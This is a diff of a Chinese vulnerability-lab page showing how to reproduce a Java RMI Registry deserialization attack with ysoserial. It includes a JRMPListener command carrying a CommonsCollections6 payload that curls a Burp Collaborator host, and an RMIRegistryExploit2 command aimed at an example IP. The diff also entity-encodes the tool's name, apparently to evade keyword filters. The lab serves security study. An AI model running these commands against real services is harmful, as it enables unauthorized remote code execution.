@@ -42,22 +42,25 @@ Vulhub 执行如下命令编译及启动 RMI Registry 和服务器：
 ```
 docker-compose build
 docker-compose run -e RMIIP=your-ip -p 1099:1099 rmi
-```
+<details>
+<summary>POC 代码（点击展开 · 仅供学习，请勿用于非授权测试）</summary>
 
+<pre><code class="language-text">
 其中，`your-ip` 是服务器 IP，客户端会根据这个 IP 来连接服务器。
 
 环境启动后，RMI Registry 监听在 1099 端口。
 
 ## 漏洞复现
 
-通过 [ysoserial](https://github.com/wh1t3p1g/ysoserial) 的 exploit 包中的 RMIRegistryExploit2 或者 3 进行攻击
+通过 [&#121;soserial](https://github.com/wh1t3p1g/&#121;soserial) 的 exploit 包中的 RMIRegistryExploit2 或者 3 进行攻击
 
 ```bash
 // 开启JRMPListener
-java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 8888 CommonsCollections6 "curl http://xxxxx.burpcollaborator.net"
+java -cp &#121;soserial-0.0.6-SNAPSHOT-all.jar &#121;soserial.exploit.JRMPListener 8888 CommonsCollections6 "curl http://xxxxx.burpcollaborator.net"
 // 发起攻击
-java -cp target/ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.RMIRegistryExploit2 192.168.31.88 1099 jrmphost 8888
-```
+java -cp target/&#121;soserial-0.0.6-SNAPSHOT-all.jar &#121;soserial.exploit.RMIRegistryExploit2 192.168.31.88 1099 jrmphost 8888</code></pre>
+
+</details>
 
 ![image-20200206135822418](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/language/images/image-20200206135822418.png)
 
